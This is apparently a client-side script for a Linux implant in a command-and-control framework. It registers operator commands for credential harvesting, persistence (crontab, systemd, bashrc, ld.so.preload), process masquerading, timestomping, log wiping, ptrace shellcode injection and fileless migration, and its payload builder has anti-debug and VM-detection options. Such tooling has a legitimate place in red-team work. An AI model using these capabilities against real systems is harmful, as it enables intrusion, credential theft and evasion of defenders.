/// Linux Agent (Native C)

let exit_action = menu.create_action("Exit", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "exit")) });
menu.add_session_agent(exit_action, ["linux"])

let file_browser_action     = menu.create_action("File Browser",    function(agents_id) { agents_id.forEach(id => ax.open_browser_files(id)) });
let process_browser_action  = menu.create_action("Process Browser", function(agents_id) { agents_id.forEach(id => ax.open_browser_process(id)) });
let terminal_browser_action = menu.create_action("Remote Terminal", function(agents_id) { agents_id.forEach(id => ax.open_remote_terminal(id)) });
menu.add_session_browser(file_browser_action, ["linux"])
menu.add_session_browser(process_browser_action, ["linux"])
menu.add_session_browser(terminal_browser_action, ["linux"])

let tunnel_access_action = menu.create_action("Create Tunnel", function(agents_id) { ax.open_access_tunnel(agents_id[0], true, true, false, false) });
menu.add_session_access(tunnel_access_action, ["linux"]);


let execute_action = menu.create_action("Execute", function(files_list) {
    file = files_list[0];
    if(file.type != "file"){ return; }

    let label_bin = form.create_label("Binary:");
    let text_bin = form.create_textline(file.path + file.name);
    text_bin.setEnabled(false);
    let label_args = form.create_label("Arguments:");
    let text_args = form.create_textline();

    let layout = form.create_gridlayout();
    layout.addWidget(label_bin, 0, 0, 1, 1);
    layout.addWidget(text_bin, 0, 1, 1, 1);
    layout.addWidget(label_args, 1, 0, 1, 1);
    layout.addWidget(text_args, 1, 1, 1, 1);

    let dialog = form.create_dialog("Execute binary");
    dialog.setSize(500, 80);
    dialog.setLayout(layout);
    if ( dialog.exec() == true )
    {
        let command = "run " + text_bin.text() + " " + text_args.text();
        ax.execute_command(file.agent_id, command);
    }
});
let download_action = menu.create_action("Download", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "download " + file.path + file.name) ) });
let remove_action = menu.create_action("Remove", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "rm " + file.path + file.name) ) });
menu.add_filebrowser(download_action, ["linux"])
menu.add_filebrowser(remove_action, ["linux"])


let job_stop_action = menu.create_action("Stop job", function(tasks_list) {
    tasks_list.forEach((task) => {
        if(task.type == "JOB" && task.state == "Running") {
            ax.execute_command(task.agent_id, "job kill " + task.task_id);
        }
    });
});
menu.add_tasks_job(job_stop_action, ["linux"])


let cancel_action = menu.create_action("Cancel", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "job kill " + file.file_id) ) });
menu.add_downloads_running(cancel_action, ["linux"])



var event_files_action = function(id, path) {
    ax.execute_browser(id, "ls " + path);
}
event.on_filebrowser_list(event_files_action, ["linux"]);

var event_upload_action = function(id, path, filepath) {
    let filename = ax.file_basename(filepath);
    ax.execute_browser(id, "upload " + filepath + " " + path + filename);
}
event.on_filebrowser_upload(event_upload_action, ["linux"]);

var event_process_action = function(id) {
    ax.execute_browser(id, "ps");
}
event.on_processbrowser_list(event_process_action, ["linux"]);



function RegisterCommands(listenerType)
{
    let cmd_cat = ax.create_command("cat", "Read a file (less 10 KB)", "cat /etc/passwd", "Task: read file");
    cmd_cat.addArgString("path", true);

    let cmd_cd = ax.create_command("cd", "Change current working directory", "cd /home/user", "Task: change working directory");
    cmd_cd.addArgString("path", true);

    let cmd_cp = ax.create_command("cp", "Copy file or directory", "cp src.txt dst.txt", "Task: copy file or directory");
    cmd_cp.addArgString("src", true);
    cmd_cp.addArgString("dst", true);

    let cmd_download = ax.create_command("download", "Download a file", "download /tmp/file", "Task: download file");
    cmd_download.addArgString("path", true);

    let cmd_exit = ax.create_command("exit", "Terminate the agent", "exit", "Task: terminate agent");

    let cmd_getuid = ax.create_command("getuid", "Get current user and UID", "getuid", "Task: get user info");

    let cmd_env = ax.create_command("env", "List environment variables", "env", "Task: list env");

    let cmd_netstat = ax.create_command("netstat", "List network connections (TCP/UDP)", "netstat", "Task: list connections");

    let cmd_mounts = ax.create_command("mounts", "List mount points", "mounts", "Task: list mounts");

    let cmd_edr = ax.create_command("edr", "Detect installed security tools (EDR, AV, audit)", "edr", "Task: EDR detection");

    let cmd_creds = ax.create_command("creds", "Credential harvest", "creds all", "Task: credential harvest");
    cmd_creds.addArgString("type", "", "all");

    let _cmd_persist_crontab = ax.create_command("crontab", "Install crontab persistence", "persist crontab /tmp/agent \"*/5 * * * *\"");
    _cmd_persist_crontab.addArgString("cmd", true);
    _cmd_persist_crontab.addArgString("schedule", "", "*/5 * * * *");
    let _cmd_persist_systemd = ax.create_command("systemd", "Install systemd user service", "persist systemd myservice /tmp/agent");
    _cmd_persist_systemd.addArgString("name", true);
    _cmd_persist_systemd.addArgString("cmd", true);
    let _cmd_persist_bashrc = ax.create_command("bashrc", "Append to ~/.bashrc", "persist bashrc \"/tmp/agent &\"");
    _cmd_persist_bashrc.addArgString("cmd", true);
    let _cmd_persist_ldpreload = ax.create_command("ldpreload", "Write to /etc/ld.so.preload (root)", "persist ldpreload /tmp/agent.so");
    _cmd_persist_ldpreload.addArgString("path", true);
    let _cmd_persist_remove = ax.create_command("remove", "Remove persistence", "persist remove crontab");
    _cmd_persist_remove.addArgString("type", true);
    _cmd_persist_remove.addArgString("name", false);
    let _cmd_persist_status = ax.create_command("status", "List active persistence mechanisms", "persist status");
    let cmd_persist = ax.create_command("persist", "Persistence management");
    cmd_persist.addSubCommands([_cmd_persist_crontab, _cmd_persist_systemd, _cmd_persist_bashrc, _cmd_persist_ldpreload, _cmd_persist_remove, _cmd_persist_status]);

    let _cmd_container_detect = ax.create_command("detect", "Detect container runtime and cloud provider", "container detect");
    let _cmd_container_metadata = ax.create_command("metadata", "Fetch cloud instance metadata (IMDS)", "container metadata");
    let cmd_container = ax.create_command("container", "Container/Cloud detection and metadata");
    cmd_container.addSubCommands([_cmd_container_detect, _cmd_container_metadata]);

    let cmd_masquerade = ax.create_command("masquerade", "Masquerade process name (OPSEC)", "masquerade [kworker/0:1-events]", "Task: masquerade process");
    cmd_masquerade.addArgString("name", "", "[kworker/0:1-events]");

    let cmd_timestomp = ax.create_command("timestomp", "Modify file timestamps (OPSEC)", "timestomp /tmp/agent 0", "Task: timestomp");
    cmd_timestomp.addArgString("path", true);
    cmd_timestomp.addArgInt("timestamp", "", 0);

    let cmd_cleanlog = ax.create_command("cleanlog", "Truncate system logs (requires root)", "cleanlog", "Task: clean logs");

    let cmd_inject = ax.create_command("inject", "Inject shellcode into process via ptrace", "inject 1234 AAAA", "Task: inject shellcode");
    cmd_inject.addArgInt("pid", true);
    cmd_inject.addArgString("shellcode", true);

    let cmd_migrate = ax.create_command("migrate", "Re-exec agent from memfd (fileless)", "migrate", "Task: migrate agent");

    let _cmd_job_list = ax.create_command("list", "List of jobs", "job list", "Task: show jobs");
    let _cmd_job_kill = ax.create_command("kill", "Kill a specified job", "job kill 1a2b3c4d", "Task: kill job");
    _cmd_job_kill.addArgString("task_id", true);
    let cmd_job = ax.create_command("job", "Long-running tasks manager");
    cmd_job.addSubCommands([_cmd_job_list, _cmd_job_kill]);

    let cmd_kill = ax.create_command("kill", "Kill a process with a given PID", "kill 7865", "Task: kill process");
    cmd_kill.addArgInt("pid", true);

    let cmd_ls = ax.create_command("ls", "List contents of a directory", "ls /home/", "Task: list files");
    cmd_ls.addArgString("path", "", ".");

    let cmd_mv = ax.create_command("mv", "Move/rename file or directory", "mv src.txt dst.txt", "Task: move file");
    cmd_mv.addArgString("src", true);
    cmd_mv.addArgString("dst", true);

    let cmd_mkdir = ax.create_command("mkdir", "Create directory", "mkdir /tmp/ex", "Task: make directory");
    cmd_mkdir.addArgString("path", true);

    let cmd_ps = ax.create_command("ps", "Show process list", "ps", "Task: show process list");

    let cmd_pwd = ax.create_command("pwd", "Print current working directory", "pwd", "Task: print working directory");

    let cmd_rm = ax.create_command("rm", "Remove a file or folder", "rm /tmp/file", "Task: remove file or directory");
    cmd_rm.addArgString("path", true);

    let cmd_run = ax.create_command("run", "Execute program in background", "run /tmp/script.sh", "Task: command run");
    cmd_run.addArgString("program", true);
    cmd_run.addArgString("args", false);

    let _cmd_socks_start = ax.create_command("start", "Start a SOCKS5 proxy server", "socks start 1080 -a user pass");
    _cmd_socks_start.addArgFlagString("-h", "address", "Listening interface address", "0.0.0.0");
    _cmd_socks_start.addArgInt("port", true, "Listen port");
    _cmd_socks_start.addArgBool("-a", "Enable User/Password authentication");
    _cmd_socks_start.addArgString("username", false, "Username");
    _cmd_socks_start.addArgString("password", false, "Password");
    let _cmd_socks_stop = ax.create_command("stop", "Stop a SOCKS proxy server", "socks stop 1080");
    _cmd_socks_stop.addArgInt("port", true);
    let cmd_socks = ax.create_command("socks", "Managing socks tunnels");
    cmd_socks.addSubCommands([_cmd_socks_start, _cmd_socks_stop]);

    let cmd_shell = ax.create_command("shell", "Execute command via /bin/sh", "shell id", "Task: command execute");
    cmd_shell.addArgString("cmd", true);

    let cmd_upload = ax.create_command("upload", "Upload a file", "upload /tmp/file.txt /root/file.txt", "Task: upload file");
    cmd_upload.addArgFile("local_file", true);
    cmd_upload.addArgString("remote_path", false);

    let cmd_link = ax.create_command("link", "Link to a child agent via TCP pivot", "link 192.168.1.10 4444", "Task: link pivot");
    cmd_link.addArgString("target", true);
    cmd_link.addArgInt("port", true);

    let cmd_unlink = ax.create_command("unlink", "Unlink a pivot connection", "unlink p0", "Task: unlink pivot");
    cmd_unlink.addArgString("id", true);

    let _cmd_exec_bof = ax.create_command("bof", "Execute a BOF (ELF .o file) in-memory", "execute bof /path/to/bof.o", "Task: execute BOF");
    _cmd_exec_bof.addArgFile("bof", true);
    _cmd_exec_bof.addArgString("param_data", false);
    _cmd_exec_bof.addArgBool("async", false);
    let cmd_execute = ax.create_command("execute", "Execute a BOF file in-memory");
    cmd_execute.addSubCommands([_cmd_exec_bof]);

    let commands = ax.create_commands_group("linux", [cmd_cat, cmd_cd, cmd_cleanlog, cmd_container, cmd_cp, cmd_creds, cmd_download, cmd_edr, cmd_env, cmd_execute, cmd_exit, cmd_getuid, cmd_inject, cmd_job, cmd_kill, cmd_link, cmd_ls, cmd_masquerade, cmd_migrate, cmd_mounts, cmd_mv, cmd_mkdir, cmd_netstat, cmd_persist, cmd_ps, cmd_pwd, cmd_rm, cmd_run, cmd_shell, cmd_socks, cmd_timestomp, cmd_unlink, cmd_upload]);

    return {
        commands_linux: commands
    }
}

function GenerateUI(listeners_type)
{
    let labelArch = form.create_label("Arch:");
    let comboArch = form.create_combo()
    comboArch.addItems(["x86_64", "ARM64"]);

    let labelFormat = form.create_label("Format:");
    let comboFormat = form.create_combo()
    comboFormat.addItems(["Binary ELF (Native)", "Shared Object (Native)", "Shellcode x86_64 (Native)", "Shellcode ARM64 (Native)"]);

    let hline = form.create_hline()

    let labelReconnTimeout = form.create_label("Reconnect timeout:");
    let textReconnTimeout = form.create_textline("10");
    textReconnTimeout.setPlaceholder("seconds")

    let labelReconnCount = form.create_label("Reconnect count:");
    let spinReconnCount = form.create_spin();
    spinReconnCount.setRange(0, 1000000000);
    spinReconnCount.setValue(3);

    // Hide reconnect settings for bind_tcp listeners (internal — no outbound connection)
    if( listeners_type.includes("LinuxTCP") && listeners_type.length == 1 ) {
        labelReconnTimeout.setVisible(false);
        textReconnTimeout.setVisible(false);
        labelReconnCount.setVisible(false);
        spinReconnCount.setVisible(false);
    }

    let hline2 = form.create_hline()
    let checkOpsec = form.create_check("OPSEC Checks (anti-debug, VM detection, string obfuscation)");

    let layout = form.create_gridlayout();
    layout.addWidget(labelArch, 0, 0, 1, 1);
    layout.addWidget(comboArch, 0, 1, 1, 1);
    layout.addWidget(labelFormat, 1, 0, 1, 1);
    layout.addWidget(comboFormat, 1, 1, 1, 1);
    layout.addWidget(hline, 2, 0, 1, 2);
    layout.addWidget(labelReconnTimeout, 3, 0, 1, 1);
    layout.addWidget(textReconnTimeout, 3, 1, 1, 1);
    layout.addWidget(labelReconnCount, 4, 0, 1, 1);
    layout.addWidget(spinReconnCount, 4, 1, 1, 1);
    layout.addWidget(hline2, 5, 0, 1, 2);
    layout.addWidget(checkOpsec, 6, 0, 1, 2);

    let container = form.create_container()
    container.put("arch", comboArch)
    container.put("format", comboFormat)
    container.put("reconn_timeout", textReconnTimeout)
    container.put("reconn_count", spinReconnCount)
    container.put("opsec_enabled", checkOpsec)

    let panel = form.create_panel()
    panel.setLayout(layout)

    return {
        ui_panel: panel,
        ui_container: container,
        ui_height: 400,
        ui_width: 550
    }
}
